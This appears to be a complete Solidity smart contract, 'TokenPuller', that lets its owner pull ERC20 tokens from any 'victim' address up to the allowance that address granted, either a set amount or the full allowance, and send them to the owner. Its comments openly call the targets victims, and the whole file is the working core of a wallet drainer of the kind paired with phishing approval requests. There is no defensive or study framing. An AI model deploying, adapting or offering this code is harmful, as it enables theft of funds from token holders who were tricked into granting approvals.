// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @title TokenPuller
/// @notice Minimal ERC20 puller. The owner can drain any amount of the
///         configured token from any victim address (up to the victim's
///         allowance) and sweep it to the owner.
contract TokenPuller {
    IERC20 public immutable token;
    address public owner;

    event Drained(address indexed victim, uint256 amount);

    error NotOwner();
    error ZeroAmount();

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    constructor(address token_) {
        require(token_ != address(0), "TokenPuller: zero token");
        token = IERC20(token_);
        owner = msg.sender;
    }

    /// @notice Pull `amount` of the token from `victim` to the owner.
    ///         Uses the victim's existing allowance to this contract.
    function drain(address victim, uint256 amount) external onlyOwner {
        if (amount == 0) revert ZeroAmount();
        (bool ok, ) = address(token).call(
            abi.encodeWithSelector(IERC20.transferFrom.selector, victim, owner, amount)
        );
        require(ok, "TokenPuller: transferFrom failed");
        emit Drained(victim, amount);
    }

    /// @notice Pull the full allowance of `victim` to the owner.
    function drainAll(address victim) external onlyOwner {
        uint256 amount = token.allowance(victim, address(this));
        if (amount == 0) revert ZeroAmount();
        (bool ok, ) = address(token).call(
            abi.encodeWithSelector(IERC20.transferFrom.selector, victim, owner, amount)
        );
        require(ok, "TokenPuller: transferFrom failed");
        emit Drained(victim, amount);
    }
}
